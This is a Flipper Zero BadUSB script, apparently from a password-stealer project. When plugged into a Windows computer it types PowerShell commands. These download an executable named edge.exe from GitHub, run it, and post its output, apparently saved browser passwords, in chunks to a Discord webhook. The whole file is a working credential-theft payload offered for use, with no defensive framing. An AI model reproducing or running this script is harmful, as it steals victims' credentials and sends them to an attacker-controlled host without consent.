let badusb = require("badusb");

let script = [
    "$webhookUrl = '<webhook>';",
    "$exeUrl = 'https://github.com/RiadZX/FlipperPasswordStealer/raw/master/build/edge.exe';",
    "$exePath = '.\\edge.exe';",
    "if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}",
    "$commandOutput = & $exePath;",
    "$commandOutput = & '.\\edge.exe' | Out-String;",
    "$chunks = [Math]::Ceiling($commandOutput.Length / 2000);for ($i = 0; $i -lt $chunks; $i++) {$start = $i * 2000;$length = [Math]::Min(2000, $commandOutput.Length - $start);$content = $commandOutput.Substring($start, $length);$discordData = @{'username' = 'Flipper';'content' = $content;};$jsonData = ConvertTo-Json -InputObject $discordData;Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json';}"
];

badusb.setup({
    vid: 0xAAAA,
    pid: 0xBBBB,
    mfr_name: "Flipper",
    prod_name: "Zero",
    layout_path: "/ext/badusb/assets/layouts/en-US.kl"
});

let command = "";
for (let i = 0; i < script.length; i++) {
    command += script[i];
}

print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}

badusb.press("GUI", "x");
delay(300);
badusb.press("i");
delay(3000);
print("Running payload");
badusb.println(command, 10);
badusb.press("ENTER");
badusb.quit();
print("done :)");